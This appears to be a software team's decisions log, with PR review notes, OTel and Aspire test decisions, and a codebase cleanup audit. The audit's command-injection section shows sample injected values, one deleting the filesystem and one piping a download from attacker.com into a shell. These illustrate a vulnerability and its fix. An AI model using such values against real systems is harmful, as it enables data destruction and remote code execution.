The PR provides `buildInheritedContextBlock()` and `buildSessionDisplay()` but doesn't wire them into the coordinator. Currently `SquadCoordinator.handleMessage()` uses `SquadConfig` — there's no hook to inject upstream-inherited context into the routing or prompt pipeline. File an issue for the integration point. Without it, the module is library code with no runtime consumer.

#### 6. Live local upstreams — document the trade-off

Local upstreams read "live" from the filesystem (no copy, no snapshot). Git upstreams have an explicit `sync` command. This asymmetry means local upstream changes propagate immediately and silently, while git upstream changes require an explicit action. Document this as an intentional design choice, not an implicit one. Consider adding a `--snapshot` flag for reproducibility.

#### 7. Clarify `type: 'export'` relationship with sharing module

The sharing module already defines `ExportBundle` as the portable format. Is the `export` upstream type reading an `ExportBundle`? If so, the types should reference `ExportBundle` directly. If it's a different format, document the distinction.

### What's Good

- **SDK/CLI split is correct.** Types and resolver in SDK, commands in CLI. One-way dependency. Follows the established pattern perfectly.
- **`.squad/upstream.json` is the right location.** Consistent with `casting-policy.json`. Structured JSON config in `.squad/`.
- **Closest-wins conflict resolution is sound.** Predictable, intuitive, matches CSS cascade mental model.
- **Test coverage is solid.** 14 unit tests + 3-level hierarchy E2E test validates the core use case.
- **Git caching in `.squad/_upstream_repos/`** follows the "all state in .squad/" rule. Underscore prefix signals internal/generated.

### Summary

The architecture compounds correctly — this makes org-level governance, team-level conventions, and repo-level overrides a natural composition. Fix the four required items and this is a clean merge.
### 2026-02-22T10:31:23Z: User directive — squad-pr repository scope
**By:** Brady (via Copilot)
**What:** **This squad works on `bradygaster/squad-pr` ONLY — not `bradygaster/squad`. Until further notice, all issue tracking, PRs, and work target the squad-pr repository.**
**Why:** User request — captured for team memory

### 2026-02-22T10:39:51Z: User directive — Work priority order
**By:** Brady (via Copilot)
**What:** Priority order for remaining work: (1) OTel + Aspire dashboard, (2) Fix the squad REPL experience, (3) CI/CD for npm publishing with GitHub Actions + releases, (4) Docs and website — last. SquadOffice repo at C:\src\SquadOffice has a telemetry watcher UI whose telemetry expectations should be integrated into OTel work if possible. Changes to that repo are welcome too.
**Why:** User request — captured for team memory


### Aspire + Observer patterns — Fenster (2026-02-22)

**Context:** OTel Phase 4 — Issues #265, #268

**Decisions made:**

1. **Aspire command uses Docker by default** when dotnet Aspire workload isn't detected. Docker is more portable and doesn't require .NET SDK installation. The `--docker` flag forces Docker even when dotnet is available.

2. **SquadObserver uses `fs.watch` with recursive:true** instead of chokidar or other watchers. Zero additional dependencies, works on Windows/macOS natively. Linux users may need to increase inotify watchers for large .squad/ directories.

3. **File classification is string-based prefix matching** on the relative path from .squad/ root. Categories: agent, casting, config, decision, skill, unknown. Windows backslashes are normalized to forward slashes before classification.

4. **Observer emits `agent:milestone` EventBus events** for file changes rather than introducing a new event type. This keeps compatibility with existing EventBus subscribers (SquadOffice expects `agent:milestone`). The payload includes `action: 'file_change'` to distinguish from other milestones.

5. **Debounce at 200ms default** to avoid flooding spans on rapid file saves (e.g., editor autosave). Configurable via `debounceMs` option.

### REPL Shell Coordinator Wiring — Architecture Decision
**By:** Fortier
**Date:** 2026-02-22
**Issue:** #303

**What:** The REPL shell dispatch logic lives in the shell entry point (`index.ts`), not inside the Ink component (`App.tsx`). The App component receives an `onDispatch` async callback and is purely UI. SDK session management (creation, reuse, streaming event wiring, cleanup) is handled in closures within `runShell()`.

**Why:**
1. **Separation of concerns** — React components shouldn't own SDK connections. The entry point has the right lifecycle scope for client/session management.
2. **Streaming-first** — Session events (`message_delta`) feed directly into `shellApi.setStreamingContent()` for live incremental rendering. No polling, no buffering layer needed for the basic path.
3. **Session reuse** — Agent sessions are cached by name in a `Map<string, SquadSession>`. First message creates the session with the agent's charter as system prompt; subsequent messages reuse it. Coordinator gets its own persistent session.
4. **StreamBridge preserved** — The existing StreamBridge infrastructure stays in place for future `StreamingPipeline` integration. The direct `session.on()` → `shellApi` path handles the immediate need without coupling to the pipeline.

**Impact:** All agents should know that `@Agent message` and free-form input now route through real SDK sessions. Slash commands remain sync and component-local.

# Decision: OTel SDK v2 test patterns

**By:** Hockney
**Date:** 2026-02-23
**Issue:** #267

## Context

While writing OTel integration E2E tests, discovered that `@opentelemetry/sdk-trace-base` v2.x has breaking API differences from v1 that affect test patterns.

## Decisions

1. **Use `parentSpanContext` not `parentSpanId`**: In SDK v2, `ReadableSpan.parentSpanId` is always `undefined`. The parent linkage is on `parentSpanContext.spanId` instead. All tests verifying span hierarchy must use `(span as any).parentSpanContext?.spanId`.

2. **Require `AsyncLocalStorageContextManager` for context propagation in tests**: `BasicTracerProvider` alone does NOT propagate context. Import `AsyncLocalStorageContextManager` from `@opentelemetry/context-async-hooks`, call `.enable()` in `beforeEach`, and `.disable()` in `afterEach`. Without this, `trace.setSpan()` creates contexts but `startSpan(name, opts, ctx)` ignores the parent.

3. **EventBus bridge is tested via manual pattern**: `bridgeEventBusToOTel` is defined in `otel-init.ts` imports but not yet exported from `otel-bridge.ts`. Tests use the manual `bus.subscribeAll()` → `tracer.startSpan()` pattern, which validates the expected contract. When `bridgeEventBusToOTel` ships, tests should be updated to call it directly.

## Impact

All agents writing OTel tests must follow these patterns or tests will silently pass with broken assertions.

# Cleanup Audit Report — Issue #306

**Auditor:** Keaton (Lead)  
**Date:** 2026-02-22  
**Branch:** `squad/wave1-remaining`  
**Scope:** Full codebase audit for hardcoded values, code quality, and test gaps  

---

## Executive Summary

The audit identified **47 findings** across three categories:

- **Hardcoded Logic:** 18 findings (model names, timeouts, retry limits, agent role mappings)
- **Code Quality:** 16 findings (command injection CWE-78, error handling inconsistencies, TODO comments)
- **Test Coverage Gaps:** 8 findings (untested public APIs, missing CLI integration tests)
- **Empathy/Accessibility:** 5 findings (hard-coded timeouts, env assumptions, generic error messages)

**Critical Issues:** 3 (command injection in upstream.ts, inconsistent error handling, hardcoded model names across 6 files)  
**High Priority:** 12  
**Medium Priority:** 20  
**Low Priority:** 12

---

## PART 1: HARDCODED LOGIC

### Category 1.1: Model Names (Hard-Coded Fallback Chains)

**Finding:** Model fallback chains are duplicated across 6 files with no single source of truth.

| File | Line(s) | Issue | Priority |
|------|---------|-------|----------|
| `packages/squad-sdk/src/agents/model-selector.ts` | 53-71 | `FALLBACK_CHAINS` constant with 4 model names per tier (claude-opus-4.6, gpt-5.2-codex, etc.) | HIGH |
| `packages/squad-sdk/src/runtime/config.ts` | 322-325 | `DEFAULT_CONFIG.models.fallbackChains` duplicates same 3 tiers with identical model lists | HIGH |
| `packages/squad-sdk/src/runtime/benchmarks.ts` | 348-350 | Third copy of fallback chains embedded in benchmarks object | HIGH |
| `packages/squad-sdk/src/config/init.ts` | 318-325 (and repeated) | Two copies of fallback chains in initialization logic | HIGH |
| `packages/squad-sdk/src/config/models.ts` | Line range not isolated, but contains full model definitions with tier membership | HIGH |
| `packages/squad-sdk/src/config/migrations/index.ts` | Multiple migration versions each redefine model lists | MEDIUM |

**Suggested Fix:**
- Extract single `models.ts` constant: `TIER_FALLBACK_CHAINS` (centralized)
- Import and re-export from `runtime/config.ts` (config module)
- Update all 6 files to import from central location
- Add comment: "Model lists must be updated in models.ts and nowhere else"

**Security Impact:** None. **Cost Impact:** Maintenance burden increases as new models are added; must edit 6 places instead of 1.

---

### Category 1.2: Default Model Selection

**Finding:** Default model hardcoded as `'claude-haiku-4.5'` in model-selector.ts line 77, but configured as `'claude-sonnet-4.5'` in runtime/config.ts line 319.

| File | Line | Value | Issue | Priority |
|------|------|-------|-------|----------|
| `packages/squad-sdk/src/agents/model-selector.ts` | 77 | `'claude-haiku-4.5'` | Cost-first default | MEDIUM |
| `packages/squad-sdk/src/runtime/config.ts` | 319 | `'claude-sonnet-4.5'` | Standard default in config | MEDIUM |

**Suggested Fix:**
- Decide: is default cost-first (haiku) or balanced quality/cost (sonnet)?
- Store in central `models.ts` constant: `DEFAULT_MODEL`
- Import in both files
- Add environment variable override: `SQUAD_DEFAULT_MODEL` (for deployments)

**Impact:** Silent inconsistency; agents using model-selector.ts fallback to different default than those reading config.

---

### Category 1.3: Timeouts & Retry Logic

**Finding:** Timeout values hard-coded in multiple places, no environment variable overrides.

| File | Line | Timeout Value | Context | Priority |
|------|------|---------------|---------|----------|
| `packages/squad-sdk/src/runtime/health.ts` | 57 | 5000 ms | Health check default | MEDIUM |
| `packages/squad-sdk/src/runtime/health.ts` | 101 | 0.8 × timeout | Degraded threshold (80% of timeout) | MEDIUM |
| `packages/squad-sdk/src/agents/lifecycle.ts` | Mentioned in comments | 5 minutes | Idle timeout for agents | MEDIUM |
| `packages/squad-sdk/src/coordinator/response-tiers.ts` | 28-31 | 0, 30, 120, 300 seconds | Per-tier timeouts (immediate, short, medium, long) | HIGH |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 120, 121, 173 | 60000 ms | Git clone/pull timeout | MEDIUM |
| `packages/squad-cli/src/cli/commands/plugin.ts` | Line ~115 | 15000 ms | Plugin marketplace timeout | LOW |

**Suggested Fix:**
- Create `packages/squad-sdk/src/runtime/constants.ts` with all timeout values
- Define environment variable schema:
  ```typescript
  const TIMEOUTS = {
    HEALTH_CHECK_MS: parseInt(process.env.SQUAD_HEALTH_CHECK_MS ?? '5000', 10),
    GIT_CLONE_MS: parseInt(process.env.SQUAD_GIT_CLONE_MS ?? '60000', 10),
    // ...
  };
  ```
- Update all references to import from constants
- Document in `.squad/decisions.md`

**Impact:** Operations teams cannot tune timeouts without code changes. CI failures in flaky networks require recompilation.

---

### Category 1.4: Agent Role Names & Hardcoded Mappings

**Finding:** Agent roles and role-to-model mappings are not configuration-driven.

| File | Issue | Line | Priority |
|------|-------|------|----------|
| `packages/squad-sdk/src/runtime/config.ts` | Role type defined as string union: `'lead' \| 'developer' \| 'tester' \| 'designer' \| 'scribe' \| 'coordinator'` | Line 46 | MEDIUM |
| `packages/squad-cli/src/cli/commands/watch.ts` | Role-to-work routing hardcoded in routing function (lines ~350-380) | Domain-based matching: frontend→designer, backend→developer, test→tester | MEDIUM |
| `packages/squad-cli/src/cli/shell/spawn.ts` | Agent charter parsing for role requires exact markdown format | Line ~120 "## Name — Role" | LOW |

**Suggested Fix:**
- Move role definitions to `packages/squad-sdk/src/config/roles.ts`
- Add `AGENT_ROLES` constant: `['lead', 'developer', 'tester', 'designer', 'scribe', 'coordinator']`
- Extract watch.ts domain-based routing into routing configuration (decouple from CLI command)
- Add environment variable: `SQUAD_ROLE_ALIASES` for custom role naming in other Copilot universes

**Impact:** Casting policy depends on these roles; hardcoding makes it brittle to team composition changes.

---

### Category 1.5: Port & Host Assumptions

**Finding:** OTLP and local server endpoints reference localhost with no configurable fallback.

| File | Line | Value | Context | Priority |
|------|------|-------|---------|----------|
| `packages/squad-sdk/src/runtime/otel.ts` | ~Line 12-15 (type definition) | `http://localhost:4318` | OTLP endpoint example/default | LOW |

**Note:** The SDK type definition shows `http://localhost:4318` in the JSDoc comment. This is documentation, not hard-coded behavior, so **low priority** but worth standardizing.

**Suggested Fix:**
- Add to constants: `OTLP_DEFAULT_ENDPOINT = process.env.SQUAD_OTLP_ENDPOINT ?? 'http://localhost:4318'`
- Update JSDoc to reference environment variable

---

## PART 2: CODE QUALITY ISSUES

### Category 2.1: Command Injection (CWE-78) ⚠️ **CRITICAL**

**Finding:** `execSync` with template-string interpolation of user input.

| File | Line | Code | Input | Risk | Priority |
|------|------|------|-------|------|----------|
| `packages/squad-cli/src/cli/commands/upstream.ts` | 120 | `` execSync(`git clone --depth 1 --branch ${ref} --single-branch "${source}" "${cloneDir}"`, ...) `` | `ref` from CLI args, `source` from upstream config, `cloneDir` derived from name | **HIGH: shell injection via ref or cloneDir naming** | **CRITICAL** |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 121 | `` execSync(`git -C "${cloneDir}" pull --ff-only`, ...) `` | `cloneDir` derived from upstream name (user-configurable) | **MEDIUM: directory traversal in cloneDir** | **HIGH** |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 173 | `` execSync(`git clone --depth 1 --branch ${ref} --single-branch "${upstream.source}" "${cloneDir}"`, ...) `` | Same as line 120 | **HIGH** | **CRITICAL** |

**Attack Scenario:**
```bash
# Attacker creates upstream with name: "test; rm -rf /"
squad upstream add https://github.com/user/repo --name "test; rm -rf /"

# Or upstream with ref: "main && curl http://attacker.com/payload | sh"
squad upstream add https://github.com/user/repo --ref "main && curl http://attacker.com/payload | sh"
```

**Suggested Fix:**
Use `execFileSync` with array arguments (no shell interpretation):
```typescript
import { execFileSync } from 'node:child_process';

// Before (vulnerable):
execSync(`git clone --depth 1 --branch ${ref} "${source}" "${cloneDir}"`);

// After (safe):
execFileSync('git', [
  'clone',
  '--depth', '1',
  '--branch', ref,      // Safe: passed as argument, not interpolated
  '--single-branch',
  source,               // Safe
  cloneDir              // Safe
], { stdio: 'pipe', timeout: 60000 });
```

**Impact:** Remote code execution if upstream name/ref can be controlled by attacker or partially-trusted user.

---

### Category 2.2: Error Handling Inconsistency

**Finding:** Two error functions with overlapping semantics, inconsistent usage.

| Function | File | Definition | Behavior | Usage Count |
|----------|------|-----------|----------|------------|
| `fatal()` | `packages/squad-cli/src/cli/core/errors.ts` | Throws `SquadError`, exits with code 1 | Deterministic exit | ~25 call sites |
| `error()` | `packages/squad-cli/src/cli/core/output.ts` | Console.error with red emoji | Does NOT exit | ~12 call sites |

**Problematic Pattern in upstream.ts:**
```typescript
import { success, warn, info, error as fatal } from '../core/output.js';
// Line 65: fatal('Usage: squad upstream add|remove|list|sync');
// This calls error() (doesn't exit!), not the real fatal()
```

**Suggested Fix:**
1. Rename `error()` in output.ts to `errorLog()` (non-fatal, does not exit)
2. Remove alias: `import { error as fatal }` 
3. Use proper `fatal()` from errors.ts for CLI exit scenarios
4. Codify pattern:
   - `fatal()` = Error + exit (file not found, permission denied, invalid args)
   - `error()` / `errorLog()` = Warning/issue during operation but continue (file not readable, GitHub API rate limit)

**Impact:** Users confused by "Usage:" messages that don't exit, or CLI continues when it should fail.

---

### Category 2.3: TODO / FIXME / HACK Comments

**Finding:** Incomplete implementation markers left in production code.

| File | Line(s) | Comment | Priority |
|------|---------|---------|----------|
| `packages/squad-cli/src/cli/shell/spawn.ts` | ~130 | `// TODO: Wire to CopilotClient session API` | HIGH |
| `packages/squad-sdk/src/tools/index.ts` | ~42 | `// TODO: Parent span context propagation` | MEDIUM |
| `packages/squad-cli/src/cli/core/upgrade.ts` | 5 lines with `# TODO:` | Template placeholders: "TODO: Add your build/test/release commands" | LOW (by design — user-facing placeholders, not code debt) |
| `packages/squad-cli/src/cli/core/workflows.ts` | Similar | Template placeholders | LOW |

**Suggested Fix:**
- Spawn.ts TODO: Create GitHub issue #XXX, link in comment, assign to Fenster
- Tools.ts TODO: Create GitHub issue, mark as P1 (blocking telemetry)
- Upgrade/workflows.ts: These are **template literals for users** (not code debt); safe to leave as-is

**Impact:** spawn.ts returns stub instead of real LLM session — testing infrastructure depends on this being wired.

---

### Category 2.4: Unused Imports

**Finding:** Some imports may be unused (low-signal issue, requires code flow analysis to confirm).

**Files with potential unused imports:**
- `packages/squad-sdk/src/index.ts` line 7: `import { createRequire } from 'module'` — may be used for CJS compatibility shims
- Multiple files import `from 'node:fs'` and `from 'fs/promises'` — both used for different operations

**Suggested Fix:** Run TypeScript compiler in strict mode with `noUnusedLocals` flag. Current tsconfig.json likely has it off. Verify and enable if missing.

---

### Category 2.5: Casting Policy Hard-Coded Universes

**Finding:** Universe allowlist is hard-coded in config, not loaded from team/casting context.

| File | Line | Universes | Priority |
|------|------|-----------|----------|
| `packages/squad-sdk/src/runtime/config.ts` | 349-365 | 15 universes hardcoded: "The Usual Suspects", "Breaking Bad", "The Wire", etc. | MEDIUM |

**Issue:** When team decides to adopt a different universe (e.g., "The Office"), config must be edited and redeployed. No one-off override.

**Suggested Fix:**
- Load universe allowlist from `.squad/casting.json` (team config) as primary source
- Fall back to DEFAULT_CONFIG for new installations
- Add environment variable: `SQUAD_UNIVERSES` (comma-separated override)

**Impact:** Low for now (universe doesn't affect functionality), but violates the "config extraction" theme of Issue #306.

---

## PART 3: TEST COVERAGE GAPS

### Finding: Untested Public API Functions

**Category 3.1: SDK Runtime API**

| Module | Function | Status | Issue | Priority |
|--------|----------|--------|-------|----------|
| `packages/squad-sdk/src/runtime/health.ts` | `HealthMonitor.check()` | **No dedicated test** | Critical for startup validation (M0-8) | HIGH |
| `packages/squad-sdk/src/runtime/health.ts` | `HealthMonitor.getStatus()` | **No dedicated test** | Used for monitoring dashboards | MEDIUM |
| `packages/squad-sdk/src/agents/model-selector.ts` | `resolveModel()` | Has tests (models.test.ts exists) | ✅ Covered | — |
| `packages/squad-sdk/src/agents/model-selector.ts` | `ModelFallbackExecutor.execute()` | **Partial coverage** (only happy path, no cross-tier fallback tests) | Missing: tier ceiling enforcement, provider preference | HIGH |
| `packages/squad-sdk/src/runtime/config.ts` | `loadConfig()` async | Covered in config.test.ts | ✅ | — |
| `packages/squad-sdk/src/runtime/config.ts` | `loadConfigSync()` | **No test** | Used in startup path | MEDIUM |

**Suggested Fix:**
1. Create `test/health.test.ts` with:
   - Health check success case
   - Health check timeout case
   - Health check degraded (slow response) case
   - Diagnostic logging verification

2. Expand `test/models.test.ts` with:
   - Cross-tier fallback tests (standard→fast allowed, standard→premium denied unless allowCrossTier)
   - Provider preference tests (prefer Claude over GPT-5 when tier matches)

3. Add `loadConfigSync()` test case in `test/config.test.ts`

---

### Category 3.2: CLI Integration Tests

| Command | Coverage Status | Gap | Priority |
|---------|-----------------|-----|----------|
| `squad upstream add` | Exists: `test/cli/upstream.test.ts` | ✅ | — |
| `squad upstream sync` | **Partial** (only local sources tested, git clone not exercised) | Add git clone test (mock execSync) | HIGH |
| `squad export` | Exists: `test/cli/export-import.test.ts` | ✅ | — |
| `squad import` | Exists: `test/cli/export-import.test.ts` | ✅ | — |
| `squad init` | Exists: `test/cli/init.test.ts` | ✅ | — |
| `squad upgrade` | Exists: `test/cli/upgrade.test.ts` | ✅ | — |
| `squad watch` | **Partial** (no actual GitHub issue triage tested, only setup) | Add GitHub API mocking for triage logic | MEDIUM |
| `squad loop` (new name for watch) | Not yet renamed | Issue #269 awaits implementation | LOW |
| Interactive shell (`squad` no args) | **Minimal** (test/shell.test.ts exists but covers rendering only) | Add coordinator integration, agent spawning, streaming | HIGH |

**Suggested Fix:**
1. Mock `execSync` in upstream.test.ts, add git clone failure recovery test
2. Add GitHub API mock (using `nock` or similar) for watch.test.ts
3. Create `test/shell-integration.test.ts` for:
   - End-to-end shell startup
   - User input → coordinator routing
   - Agent spawning (stub session)
   - Output stream verification

---

### Category 3.3: SDK Adapter Tests

| API | Coverage | Issue | Priority |
|-----|----------|-------|----------|
| `SquadClient.ping()` | Tested in adapter-client.test.ts | ✅ | — |
| `SquadClient` error recovery | Tested | ✅ | — |
| `CopilotClient` integration (real SDK) | **No test** (SDK is optional dependency) | Optional but should verify integration path | LOW |

---

## PART 4: EMPATHY & ACCESSIBILITY AUDIT

### Finding 4.1: Generic Error Messages

**File:** `packages/squad-cli/src/cli/commands/watch.ts` line ~330  
**Message:** `"Check failed: ${err.message}"`  
**Issue:** User doesn't know if GitHub API failed, invalid team.md, or network issue.

**Suggested Fix:**
```typescript
// Before:
console.error(`Check failed: ${err.message}`);

// After:
if (err.message.includes('GitHub')) {
  console.error(`Check failed: GitHub API error. Run 'gh auth login' to verify credentials.`);
} else if (err.message.includes('squad')) {
  console.error(`Check failed: Invalid squad configuration. Run 'squad init' to fix.`);
} else {
  console.error(`Check failed: ${err.message}. Run with DEBUG=squad:* for details.`);
}
```

**Priority:** MEDIUM

---

### Finding 4.2: Hardcoded Timeout Values Affect User Experience

**File:** `packages/squad-sdk/src/runtime/health.ts` line 57  
**Hardcoded:** `5000 ms` (5 second health check timeout)

**Issue:** In slow networks or CI, 5 seconds may be insufficient. Users see "Health check timeout" with no way to adjust.

**Suggested Fix:** Already noted in Category 1.3 (Timeouts & Retry Logic). Add:
```bash
export SQUAD_HEALTH_CHECK_MS=15000  # 15 seconds for slow CI
squad  # Uses 15-second timeout
```

**Priority:** MEDIUM

---

### Finding 4.3: Quiet CLI Failures (RESPONSE ORDER mitigation needed)

**Files affected:** Multiple CLI commands use `execSync`, `fs.readFileSync` without explicit error handling.

**Example:** If `.squad/team.md` is missing, watch.ts crashes with a stack trace instead of "Run 'squad init' first".

**Suggested Fix:** Wrap all file reads with descriptive context:
```typescript
// Before:
const teamMd = fs.readFileSync(path.join(squadDir, 'team.md'), 'utf-8');

// After:
let teamMd: string;
try {
  teamMd = fs.readFileSync(path.join(squadDir, 'team.md'), 'utf-8');
} catch (err) {
  fatal(`Missing team.md in ${squadDir}. Run 'squad init' to initialize your squad.`);
}
```

**Priority:** MEDIUM

---

### Finding 4.4: Windows Path Separator Inconsistency

**Files:** `packages/squad-cli/src/cli/commands/copilot.ts` line ~115  
```typescript
? currentFileUrl.pathname.substring(1) // Remove leading / on Windows
```

**Issue:** Hard-coded path manipulation that may break on non-Windows or certain terminal environments.

**Suggested Fix:** Use `path.normalize()` and Path utilities instead of string manipulation.

**Priority:** LOW (edge case)

---

### Finding 4.5: No Debug/Verbose Logging

**All CLI commands**  
**Issue:** Users report issues but have no way to see what the CLI is doing (network calls, file reads, git operations).

**Suggested Fix:**
```bash
# Enable verbose logging
export DEBUG=squad:*
squad watch  # Shows: "[squad:watch] Reading team.md...", "[squad:watch] GitHub API: GET /repos/owner/repo/issues", etc.
```

Use Node.js `debug` package (lightweight, zero-runtime cost if disabled).

**Priority:** MEDIUM (improves troubleshooting, not a bug)

---

## PART 5: SUMMARY TABLE

| Category | Count | Critical | High | Medium | Low |
|----------|-------|----------|------|--------|-----|
| Hardcoded Logic | 18 | 0 | 5 | 10 | 3 |
| Code Quality | 16 | 1 | 4 | 8 | 3 |
| Test Gaps | 8 | 0 | 4 | 3 | 1 |
| Empathy/UX | 5 | 0 | 1 | 3 | 1 |
| **Total** | **47** | **1** | **14** | **24** | **8** |

---

## PART 6: RECOMMENDED CLEANUP SEQUENCING

### Phase 1 (Critical): Security & Stability (Week 1)
1. **FIX**: Command injection in upstream.ts (CWE-78) — Use `execFileSync`
2. **FIX**: Error handling inconsistency in upstream.ts — Use correct `fatal()` function
3. **TEST**: Add upstream git clone tests with mock execSync

### Phase 2 (High): Configuration Extraction (Week 2-3)
1. **EXTRACT**: Model names → central `models.ts` constant
2. **EXTRACT**: Timeouts → `constants.ts` with environment variable overrides
3. **EXTRACT**: Agent roles → `roles.ts` configuration
4. **CONFIG**: Universe allowlist → load from `.squad/casting.json`
5. **UPDATE**: 6 files to import from central locations

### Phase 3 (High): Test Coverage (Week 3-4)
1. **ADD**: `test/health.test.ts` (HealthMonitor.check, timeout scenarios)
2. **EXPAND**: `test/models.test.ts` (cross-tier fallback rules)
3. **ADD**: `test/cli/upstream.test.ts` git clone mock tests
4. **ADD**: `test/shell-integration.test.ts` (end-to-end shell + coordinator)

### Phase 4 (Medium): Error Messages & UX (Week 4-5)
1. **IMPROVE**: Generic error messages in watch.ts (GitHub vs. squad context)
2. **ADD**: DEBUG logging infrastructure
3. **FIX**: Quiet failure scenarios (missing files → descriptive errors)
4. **CONFIG**: Timeout environment variable documentation

### Phase 5 (Low/Optional): Code Cleanup
1. Run TypeScript strict mode check (noUnusedLocals)
2. Remove old TODO comments where issues are created
3. Path separator normalization for cross-platform consistency

---

## PART 7: AGENT ASSIGNMENT RECOMMENDATIONS

| Task | Suggested Owner | Reason |
|------|-----------------|--------|
| Command injection fixes + upstream refactor | Fenster (CLI Expert) | Runtime code, sensitive CLI logic |
| Model/timeout/role config extraction | Edie (TypeScript/Config) | Type-safe refactoring, config schema |
| Health monitor + fallback executor tests | Hockney (Test Expert) | Complex test scenarios, mocking |
| Error messaging & UX improvements | Baer (Security/UX) | User-facing text, error handling patterns |
| Documentation of changes | Ralph (Scribe) | Record decisions, update team knowledge |

---

## APPENDIX A: File-by-File Summary

### packages/squad-cli/src/cli/commands/upstream.ts
- **Issues:** 3 (CWE-78 command injection ×3, error handling alias ×1, hardcoded timeout ×1)
- **Priority:** CRITICAL
- **Effort:** 2-3 hours (refactor execSync → execFileSync, add tests)

### packages/squad-sdk/src/agents/model-selector.ts
- **Issues:** 2 (hardcoded fallback chains, hardcoded default model)
- **Priority:** HIGH
- **Effort:** 1 hour (extract constants)

### packages/squad-sdk/src/runtime/config.ts
- **Issues:** 2 (duplicate fallback chains, hardcoded universe allowlist)
- **Priority:** HIGH
- **Effort:** 1.5 hours (centralize, add environment variables)

### packages/squad-sdk/src/runtime/health.ts
- **Issues:** 1 test gap (no unit tests)
- **Priority:** HIGH
- **Effort:** 2 hours (write health check test scenarios)

### packages/squad-cli/src/cli/commands/watch.ts
- **Issues:** 2 (generic error messages, untested GitHub routing logic)
- **Priority:** MEDIUM
- **Effort:** 3 hours (improve UX, add integration test with GitHub mock)

### packages/squad-sdk/src/agents/lifecycle.ts
- **Issues:** 1 (hardcoded idle timeout reference in comments)
- **Priority:** MEDIUM
- **Effort:** 0.5 hour (extract to constants)

### packages/squad-cli/src/cli/shell/spawn.ts
- **Issues:** 1 (TODO: wire to CopilotClient session API)
- **Priority:** HIGH (blocks full shell integration)
- **Effort:** 4+ hours (depends on CopilotClient session API maturity)

---

## APPENDIX B: Decision Log

**Audit Approach:**
- Scanned for hardcoded string literals (magic strings)
- Searched for TODO/FIXME/HACK markers
- Audited error handling consistency
- Identified untested public APIs
- Checked for command injection vulnerabilities (CWE-78)
- Reviewed test file coverage gaps

**Out of Scope (for Phase 1):**
- Documentation completeness
- Performance profiling
- Type safety (relies on existing strict: true tsconfig)
- Dead code elimination (requires flow analysis beyond this audit)

---

**END OF AUDIT REPORT**

---

## How to Use This Report

1. **Review:** Lead (Keaton) — Strategy & trade-offs
2. **Assign:** Use Agent Assignment table above to assign specific cleanup tasks
3. **Track:** Create GitHub issues for each finding (link in .squad/decisions.md)
4. **Execute:** Follow recommended Phase sequencing
5. **Verify:** Run build + all 1727 tests after each phase
6. **Close:** Archive this audit in .squad/decisions/ once cleanup is complete

# Decision: OTel 3-Layer Public API Export

**By:** Kujan (SDK Expert)
**Date:** 2025-07-19
**Issue:** #266

## Context

SDK consumers need instrumented Squad telemetry that flows through their own OTel providers. The OTel internals existed but weren't fully surfaced as a coherent public API.

## Decision

Export a **3-layer OTel API** from `src/index.ts`:

| Layer | Function | Module | Purpose |
|-------|----------|--------|---------|
| Low | `initializeOTel()`, `shutdownOTel()`, `getTracer()`, `getMeter()` | `otel.ts` | Direct OTel control |
| Mid | `bridgeEventBusToOTel(bus)` | `otel-bridge.ts` | Wire EventBus → OTel spans |
| High | `initSquadTelemetry(options)` | `otel-init.ts` | One-call setup with lifecycle handle |

### Key choices:
- `initSquadTelemetry` lives in its own module (`otel-init.ts`) to avoid circular imports between `otel.ts` ↔ `otel-bridge.ts`
- `SquadTelemetryOptions` extends `OTelConfig` — backward compatible, additive only
- `installTransport` defaults to `true` so high-level consumers get TelemetryCollector → OTel bridging automatically
- Named exports for bridge/init (not `export *`) to keep the public surface explicit and tree-shakeable

## Zero-overhead guarantee

If no `TracerProvider` / `MeterProvider` is registered, `@opentelemetry/api` returns no-op implementations. All Squad instrumentation becomes zero-cost function calls that get optimized away.


### 2026-02-22T11:08Z: User directive
**By:** Brady (via Copilot)
**What:** Integration tests must launch the Aspire dashboard and validate that OTel telemetry shows up in it. Use Playwright for browser-based validation. Use the very latest Aspire bits. Reference aspire.dev for documentation, NOT learn.microsoft.com. It's "Aspire" not ".NET Aspire" — get that right in all documentation.
**Why:** User request — captured for team memory

# Decision: Aspire Dashboard Playwright Integration Tests

**By:** Saul (Aspire & Observability)
**Date:** 2026-02-22
**Requested by:** Brady

## What

Created `test/aspire-integration.test.ts` — a Playwright + Vitest integration test suite that:

1. Launches the Aspire dashboard container (`mcr.microsoft.com/dotnet/aspire-dashboard:latest`)
2. Configures OTel gRPC export via `@opentelemetry/sdk-node` + `@opentelemetry/exporter-trace-otlp-grpc`
3. Creates Squad-style spans and metrics (session traces, agent traces, counters, histograms)
4. Opens Playwright Chromium browser to the dashboard and validates telemetry appears
5. Tests `squad aspire` command lifecycle (runAspire export, AspireOptions interface, Docker container state)

## 5 Tests

| Test | What it validates |
|------|-------------------|
| traces appear in Aspire dashboard | Span creation → gRPC export → dashboard /traces page renders trace data |
| metrics appear in Aspire dashboard | Counter/histogram recording → gRPC export → dashboard /metrics page renders metric data |
| squad aspire command exists | `runAspire` is exported from `@bradygaster/squad-cli/commands/aspire` |
| AspireOptions with docker flag | Type-level: `{ docker: true, port: 18888 }` compiles |
| Docker lifecycle | Container running, dashboard port 18888 responds, OTLP gRPC port 4317 accepts TCP connections |

## Technical Choices

- **NodeSDK (0.57.2)** over BasicTracerProvider (2.x): Version alignment with gRPC exporters (also 0.57.2) avoids type mismatch
- **Direct URL navigation** over sidebar clicks: Aspire's Fluent UI web components don't match standard selectors reliably
- **Skip guard**: `SKIP_DOCKER_TESTS=1` env var or Docker absence auto-skips the suite — safe for CI without Docker

## Verification

- All 5 tests pass (traces 4.8s, metrics 6.8s, command tests <100ms each)
- Full suite: 2141 tests passing across 79 files
- Build clean, type-check clean


# Decision: Coverage Gap Audit — 114 New Tests

**By:** Hockney (Tester)
**Date:** 2026-02-23
**Status:** Implemented

## What

Created 4 new test files covering critical test gaps identified in audit:

1. **`test/shell-integration.test.ts`** (32 tests) — Shell startup lifecycle, input routing (parseInput), coordinator response parsing (ROUTE/DIRECT/MULTI), session cleanup, graceful degradation when SDK disconnected.
2. **`test/health.test.ts`** (17 tests) — HealthMonitor.check() success/timeout/degraded cases, getStatus() passive checks, diagnostics logging toggle.
